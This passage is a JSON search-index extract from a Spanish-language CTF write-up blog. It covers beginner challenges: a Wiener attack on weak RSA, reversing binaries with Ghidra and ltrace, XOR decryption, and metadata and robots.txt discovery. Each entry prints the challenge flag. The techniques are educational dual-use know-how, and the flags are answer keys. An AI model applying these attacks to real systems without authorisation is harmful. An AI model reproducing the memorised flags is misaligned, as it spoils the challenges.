CTFlearn{CiphersAreAwesome}.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/ctf/ctflearn/cryptography/vigenere-cipher/","section":"ctf","summary":"Descifrado Vigenère","time":0,"title":"Vigenère Cipher"},{"contents":"Se nos proporciona una clave pública en formato PEM de una implementación de RSA (key.pub):\n-----BEGIN PUBLIC KEY----- MIIBHzANBgkqhkiG9w0BAQEFAAOCAQwAMIIBBwKBgQMwO3kPsUnaNAbUlaubn7ip 4pNEXjvUOxjvLwUhtybr6Ng4undLtSQPCPf7ygoUKh1KYeqXMpTmhKjRos3xioTy 23CZuOl3WIsLiRKSVYyqBc9d8rxjNMXuUIOiNO38ealcR4p44zfHI66INPuKmTG3 RQP/6p5hv1PYcWmErEeDewKBgGEXxgRIsTlFGrW2C2JXoSvakMCWD60eAH0W2PpD qlqqOFD8JA5UFK0roQkOjhLWSVu8c6DLpWJQQlXHPqP702qIg/gx2o0bm4EzrCEJ 4gYo6Ax+U7q6TOWhQpiBHnC0ojE8kUoqMhfALpUaruTJ6zmj8IA1e1M6bMqVF8sr lb/N -----END PUBLIC KEY-----  $ python3 -q \u0026gt;\u0026gt;\u0026gt; from Crypto.PublicKey import RSA \u0026gt;\u0026gt;\u0026gt; key = RSA.import_key(open('key.pub').read()) \u0026gt;\u0026gt;\u0026gt; key.n 573177824579630911668469272712547865443556654086190104722795509756891670023259031275433509121481030331598569379383505928315495462888788593695945321417676298471525243254143375622365552296949413920679290535717172319562064308937342567483690486592868352763021360051776130919666984258847567032959931761686072492923 \u0026gt;\u0026gt;\u0026gt; key.e 68180928631284147212820507192605734632035524131139938618069575375591806315288775310503696874509130847529572462608728019290710149661300246138036579342079580434777344111245495187927881132138357958744974243365962204835089753987667395511682829391276714359582055290140617797814443530797154040685978229936907206605  RSA funciona de la siguiente manera: Se cogen dos números primos grandes $p$ y $q$ y se toma $n = pq$ como módulo. Luego, se coge un exponente $e$ (típicamente $e = 65537$) y se cifra el mensage $m$ en formato decimal:\n$$ c = m^e \\pmod{n} $$\nLa clave pública es la tupla $(n, e)$, y la clave privada está compuesta por los dos números primos. Para descifrar, se necesita calcular $\\phi(n) = (p - 1) (q - 1)$ para calcular el inverso de $e$ respecto a la multiplicación, que es $d = e^{-1} \\pmod{\\phi(n)}$. Luego, el texto cifrado $c$ se descifra como:\n$$ m = c^d \\pmod{n} $$\nY esto funciona debido a que\n$$ c = m^e \\pmod{n} \\iff c^d = (m^e)^d = m^{ed} = m \\pmod{n} $$\nEl problema de esta implementación de RSA es que $e$ es muy grande. Este hecho lo hace vulnerable al ataque de Wiener. Podemos usar el módulo owiener de Python para extraer el exponente privado $d$:\n\u0026gt;\u0026gt;\u0026gt; import owiener \u0026gt;\u0026gt;\u0026gt; d = owiener.attack(key.e, key.n) \u0026gt;\u0026gt;\u0026gt; d 44217944188473654528518593968293401521897205851340809945591908757815783834933  En este punto, podemos descifrar la flag (disponible en flag.enc):\n\u0026gt;\u0026gt;\u0026gt; c = int(open('flag.enc', 'rb').read().hex(), 16) \u0026gt;\u0026gt;\u0026gt; m = pow(c, d, key.n) \u0026gt;\u0026gt;\u0026gt; from Crypto.Util.number import long_to_bytes \u0026gt;\u0026gt;\u0026gt; long_to_bytes(m) b'\\x02!\\xcf\\xb2\\x98\\x83\\xb0o@\\x9ag\\x9aX\\xa4\\xe9{Dn(\\xb2D\\xbb\\xcd\\x06\\x87\\xd1x\\xa8\\xab\\x87\"\\xbf\\x86\\xda\\x06\\xa6.\\x04,\\x89-)!\\xb36W\\x1e\\x9f\\xf7\\xac\\x9d\\x89\\xba\\x90Q+\\xacL\\xfb\\x8d~J9\\x01\\xbb\\xcc\\xf5\\xdf\\xac\\x01\\xb2{\\xdd\\xd3_\\x1c\\xa5SD\\xa7YC\\xdf\\x9a\\x18\\xea\\xdb4L\\xf7\\xcfU\\xfa\\x0b\\xaap\\x05\\xbf\\xe3/A\\x00HTB{s1mpl3_Wi3n3rs_4tt4ck}' \u0026gt;\u0026gt;\u0026gt; long_to_bytes(m).split(b'\\0')[-1] b'HTB{s1mpl3_Wi3n3rs_4tt4ck}'  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/crypto/weak-rsa/","section":"ctf","summary":"RSA. Ataque de Wiener","time":1,"title":"Weak RSA"},{"contents":"Se nos proporciona una instancia remota a la que conectarnos. Si establecemos la conexión con nc, obtenemos la flag:\n$ nc jupiter.challenges.picoctf.org 25103 You're on your way to becoming the net cat master picoCTF{nEtCat_Mast3ry_d0c64587}  ","image":"/images/misc.png","permalink":"https://7rocky.github.io/ctf/picoctf/general-skills/whats-a-net-cat/","section":"ctf","summary":"picoCTF 2019. 100 puntos. Conexión a una instancia remota","time":0,"title":"what's a net cat?"},{"contents":"Se nos proporciona una página web como esta:\nLa página habla de robots. Existe un archivo especial llamado robots.txt que previene a crawlers y arañas web que accedan a ciertas rutas listadas en el archivo. Vamos a echar un vistazo:\nGenial, hay una línea Disallow: /8028f.html, que no significa que no podamos entrar (solamente dice a los escáneres automáticos que no entren). Este es /8028f.html:\nY ahí está la flag: picoCTF{ca1cu1at1ng_Mach1n3s_8028f}.\n","image":"/images/web.png","permalink":"https://7rocky.github.io/ctf/picoctf/web-exploitation/where-are-the-robots/","section":"ctf","summary":"picoCTF 2019. 100 points. robots.txt","time":0,"title":"where are the robots"},{"contents":"Se nos proporciona un binario de 64 bits llamado wide y otro archivo llamado db.ex con algunas cadenas de texto:\n$ file wide wide: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=13869bb7ce2c22f474b95ba21c9d7e9ff74ecc3f, not stripped $ strings db.ex Primus people breathe variety practice Our home dimension Cheagaz scene control river importance The Ice Dimension Byenoovia fighting cast it parallel The Berserk Dimension Cloteprea facing motor unusual heavy The Hungry Dimension Maraqa stomach motion sale valuable The Water Dimension Aidor feathers stream sides gate The Bone Dimension Flaggle Alpha admin secret power hidden HOt* 0ANe  Si ejeutamos el binario tenemos lo siguiente:\n$ ./wide Usage: ./wide db.ex $ ./wide db.ex [*] Welcome user: kr4eq4L2$12xb, to the Widely Inflated Dimension Editor [*] [*] Serving your pocket dimension storage needs since 14,012.5 B [*] [*] Displaying Dimensions.... [*] [*] Name | Code | Encrypted [*] [X] Primus | people breathe variety practice | [*] [X] Cheagaz | scene control river importance | [*] [X] Byenoovia | fighting cast it parallel | [*] [X] Cloteprea | facing motor unusual heavy | [*] [X] Maraqa | stomach motion sale valuable | [*] [X] Aidor | feathers stream sides gate | [*] [X] Flaggle Alpha | admin secret power hidden | * [*] Which dimension would you like to examine? 6 [X] That entry is encrypted - please enter your WIDE decryption key:  La sexta opcion parece que es la que retornará la flag, pero necesitamos una clave de descifrado:\nSi usamos Ghidra para analizar el binario, veremos la función main:\nundefined8 main(intparam_1, undefined8 *param_2) { intiVar1; FILE *__stream; ulong uVar2; void*__ptr; uintuVar3; inti;  if(param_1 \u0026lt;2) { printf(\"Usage: %sdb.ex\\n\", *param_2); /* WARNING: Subroutine does not return */ exit(-1); } puts(\"[*] Welcome user: kr4eq4L2$12xb, to the Widely Inflated Dimension Editor [*]\"); puts(\"[*] Serving your pocket dimension storage needs since 14,012.5 B [*]\"); __stream =fopen((char*) param_2[1], \"r\"); if(__stream ==(FILE *) 0x0) { puts(\"[x] There was a problem accessing your database [x]\"); /* WARNING: Subroutine does not return */ exit(-1); } fseek(__stream, 0, 2); uVar2 =ftell(__stream); fseek(__stream, 0, 0); uVar2 =(uVar2 -uVar2 %0xb4) /0xb4; iVar1 =(int) uVar2; __ptr =calloc((long) iVar1,0xb4); fread(__ptr, 0xb4,(long) iVar1, __stream); fclose(__stream); puts(\"[*] Displaying Dimensions.... [*]\"); puts(\"[*] Name | Code | Encrypted [*]\"); for(i =0; i \u0026lt;iVar1; i =i +1) { if(*(int*) ((long) __ptr +(long) i *0xb4) ==0) { uVar3 =0x20; } else{ uVar3 =0x2a; } printf(\"[X] %-16s| %-32s| %6s%c%7s[*]\\n\", (long) __ptr +(long) i *0xb4+4, (long) __ptr +(long) i *0xb4+0x14, \u0026amp;DAT_0010132d, (ulong) uVar3, \u0026amp;DAT_0010132d); } menu(__ptr, uVar2 \u0026amp;0xffffffff); return0; }  Al final, existe una llamada a otra función llamada menu:\nvoidmenu(longparam_1, intparam_2) { intiVar1; longlVar2; undefined8 *puVar3; longin_FS_OFFSET; uinti; wchar_tlocal_1c8[16]; undefined8 local_188; // ... undefined8 local_10;  local_10 =*(undefined8 *) (in_FS_OFFSET +0x28); local_b8 =0; local_b0 =0; local_a8 =0; local_a0 =0; do{ while(true) { while(true) { printf(\"Which dimension would you like to examine? \"); fgets((char*) \u0026amp;local_b8, 0x20, stdin); lVar2 =strtol((char*) \u0026amp;local_b8, (char**) 0x0, 10); iVar1 =(int) lVar2; if((-1\u0026lt;iVar1) \u0026amp;\u0026amp;(iVar1 \u0026lt;param_2)) break; puts(\"That option was invalid.\"); } puVar3 =(undefined8 *) (param_1 +(long) iVar1 *0xb4); local_188 =*puVar3; local_180 =puVar3[1]; local_178 =puVar3[2]; local_170 =puVar3[3]; local_168 =puVar3[4]; local_160 =puVar3[5]; local_158 =(undefined4) puVar3[6]; uStack340 =(undefined4) ((ulong) puVar3[6] \u0026gt;\u0026gt;0x20); // ... uStack220 =(undefined4) ((ulong) puVar3[0x15] \u0026gt;\u0026gt;0x20); local_d8 =*(undefined4 *) (puVar3 +0x16); if((int) local_188 !=0) break; puts((char*) \u0026amp;uStack340); } local_98 =CONCAT44(local_150, uStack340); // ... local_20 =CONCAT44(local_d8, uStack220); printf(\"[X] That entry is encrypted - please enter your WIDE decryption key: \"); fgets(local_c8, 0x10, stdin); mbstowcs(local_1c8, local_c8, 0x10); iVar1 =wcscmp(local_1c8, L\"sup3rs3cr3tw1d3\"); if(iVar1 ==0) { for(i =0; (i \u0026lt;0x80\u0026amp;\u0026amp;(*(char*) ((long) \u0026amp;local_98 +(long) (int) i) !='\\0')); i =i +1) { *(byte *) ((long) \u0026amp;local_98 +(long) (int) i) = *(byte *)((long) \u0026amp;local_98 +(long) (int) i) ^ (char) (i *0x1b) +(char) ((int) (i *0x1b) /0xff); } puts((char*) \u0026amp;local_98); } else{ puts(\"[X] Key was incorrect [X]\"); } } while(true); }  Y ahí tenemos la contraseña: sup3rs3cr3tw1d3. Si la utilizamos obtenemos la flag:\n$ ./wide db.ex [*] Welcome user: kr4eq4L2$12xb, to the Widely Inflated Dimension Editor [*] [*] Serving your pocket dimension storage needs since 14,012.5 B [*] [*] Displaying Dimensions.... [*] [*] Name | Code | Encrypted [*] [X] Primus | people breathe variety practice | [*] [X] Cheagaz | scene control river importance | [*] [X] Byenoovia | fighting cast it parallel | [*] [X] Cloteprea | facing motor unusual heavy | [*] [X] Maraqa | stomach motion sale valuable | [*] [X] Aidor | feathers stream sides gate | [*] [X] Flaggle Alpha | admin secret power hidden | * [*] Which dimension would you like to examine? 6 [X] That entry is encrypted - please enter your WIDE decryption key: sup3rs3cr3tw1d3 HTB{som3_str1ng5_4r3_w1d3}  Podríamos pensar que esta cadena de texto se puede extraer con strings, pero no. El problema es que está separada por bytes nulos, podemos analizar el contenido hexadecimal del binario para verlo:\n$ strings wide | grep sup3rs3cr3tw1d3 $ xxd wide ... 000010d0: 5b58 5d20 5468 6174 2065 6e74 7279 2069 [X] That entry i 000010e0: 7320 656e 6372 7970 7465 6420 2d20 706c s encrypted - pl 000010f0: 6561 7365 2065 6e74 6572 2079 6f75 7220 ease enter your 00001100: 5749 4445 2064 6563 7279 7074 696f 6e20 WIDE decryption 00001110: 6b65 793a 2000 0000 7300 0000 7500 0000 key: ...s...u... 00001120: 7000 0000 3300 0000 7200 0000 7300 0000 p...3...r...s... 00001130: 3300 0000 6300 0000 7200 0000 3300 0000 3...c...r...3... 00001140: 7400 0000 7700 0000 3100 0000 6400 0000 t...w...1...d... 00001150: 3300 0000 0000 0000 5b58 5d20 2020 2020 3.......[X] 00001160: 2020 2020 2020 2020 2020 2020 2020 2020 00001170: 2020 2020 204b 6579 2077 6173 2069 6e63 Key was inc 00001180: 6f72 7265 6374 2020 2020 2020 2020 2020 orrect ...  ","image":"/images/reversing.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/reversing/wide/","section":"ctf","summary":"Clave escrita en un archivo binario","time":4,"title":"WIDE"},{"contents":"Se nos pide encontrar la flag en esta imagen:\nSin embargo, la flag no está visible en la propia imagen ni oculta en su contenido. Como el reto habla de \u0026ldquo;Meta\u0026rdquo;, lo mismo la flag se encuentra en los metadatos del archivo.\nPara extraer los metadatos podemos utilizar exiftool y filtrar por CTFlearn encadenando el comando anterior con grep:\n$ exiftool 3UWLBAUCb9Z2.jpg | grep CTFlearn Camera Serial Number : CTFlearn{EEe_x_I_FFf}  ","image":"/images/forensics.png","permalink":"https://7rocky.github.io/ctf/ctflearn/forensics/wow...-so-meta/","section":"ctf","summary":"Metadatos de archivos","time":0,"title":"WOW... So Meta"},{"contents":"El programa dice que alguien ha usado un cifrado XOR con una clave de un solo byte. Este es el resultado: * 7%8-s70\u0026amp; 61\u0026amp;\u0026gt;.\nComo sabemos que las flags empiezan por ictf{, podemos obtener la clave mediante \u0026quot;*\u0026quot; ^ \u0026quot;i\u0026quot; debido a las propiedades del cifrado XOR:\n$$ c = m \\oplus k \\iff k = c \\oplus m $$\nEntonces podemos resolver el reto así:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; from pwn import xor \u0026gt;\u0026gt;\u0026gt; c = b'* 7%8-s70\u0026 61\u0026\u0026gt;' \u0026gt;\u0026gt;\u0026gt; k = xor(c[0], b'i') \u0026gt;\u0026gt;\u0026gt; m = xor(c, k) \u0026gt;\u0026gt;\u0026gt; m b'ictf{n0tsecure}'  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/ctf/imaginaryctf/xored/","section":"ctf","summary":"ImaginaryCTF 02/09/2022. 50 puntos. Cifrado XOR","time":0,"title":"XORed"},{"contents":"Se nos proporciona el código fuente para cifrar la flag, y también el texto cifrado como un comentario en el código:\n#!/usr/bin/env python3 flag=open('flag.txt', 'rb').read() key=open('/dev/urandom','rb').read(1)[0] out=[] forcinflag: out.append(c ^ key) key=c print(f'{bytes(out).hex() = }') # bytes(out).hex() = '970a17121d121d2b28181a19083b2f021d0d03030e1526370d091c2f360f392b1c0d3a340e1c263e070003061711013b32021d173a2b1c090f31351f06072b2b1c0d3a390f1b01072b3c0b09132d33030311'  A partir del código fuente, podemos ver que la clave es un solo byte. Además, la clave se actualiza con el caracter en claro actual.\nPor tanto, podemos utilizar un script en Python para solucionar el reto:\n#!/usr/bin/env python3 defmain(): ct=bytes.fromhex('970a17121d121d2b28181a19083b2f021d0d03030e1526370d091c2f360f392b1c0d3a340e1c263e070003061711013b32021d173a2b1c090f31351f06072b2b1c0d3a390f1b01072b3c0b09132d33030311') key=ord('i') ^ct[0] flag=b'' forbinct: flag+=bytes([b^key]) key=flag[-1] print(flag.decode()) if__name__=='__main__': main()  $ python3 solve.py ictf{it_would_probably_help_if_the_key_affected_more_than_just_the_first_char_lol}  El script completo se puede encontrar aquí: solve.py.\n","image":"/images/reversing.png","permalink":"https://7rocky.github.io/ctf/imaginaryctf/xorrot/","section":"ctf","summary":"ImaginaryCTF 07/07/2022. 50 puntos. Cifrado XOR con clave rotativa","time":0,"title":"xorrot"},{"contents":"Se nos proporciona un binario llamado auth:\n$ file auth auth: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, stripped  Si lo ejecutamos, pregunta por una clave:\n$ ./auth Welcome!  Podemos introducir una clave y ver que no es correcta:\n$ ./baby Insert key: asdf I said, you can't c me!  Podemos hacer uso de ltrace para ver las llamadas a funciones externas (funciones que pertenecen a librerías como Glibc):\n$ ltrace ./auth printf(\"Welcome!\\n\"Welcome! ) = 9 malloc(21) = 0x4056b0 fgets(  Por ejemplo, utiliza printf para mostrar el mensaje y fgets para leer nuestra entrada. Si ponemos algo de texto, vemos algo interesante:\n$ ltrace ./baby printf(\"Welcome!\\n\"Welcome! ) = 9 malloc(21) = 0x4056b0 fgets(asdf \"asdf\\n\", 21, 0x7ffff7fa9980) = 0x4056b0 strcmp(\"wh00ps!_y0u_d1d_c_m3\", \"asdf\\n\") = 22 printf(\"I said, you can't c me!\\n\"I said, you can't c me! ) = 24 +++ exited (status 0) +++  Está comparando nuestra entrada con \u0026quot;wh00ps!_y0u_d1d_c_m3\u0026quot;, por lo que esta es la clave que tenemos que introducir:\n$ ./baby Welcome! wh00ps!_y0u_d1d_c_m3 HTB{wh00ps!_y0u_d1d_c_m3}  ","image":"/images/reversing.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/reversing/you-cant-c-me/","section":"ctf","summary":"Comparación de clave con strcmp","time":0,"title":"You Cant C Me"}]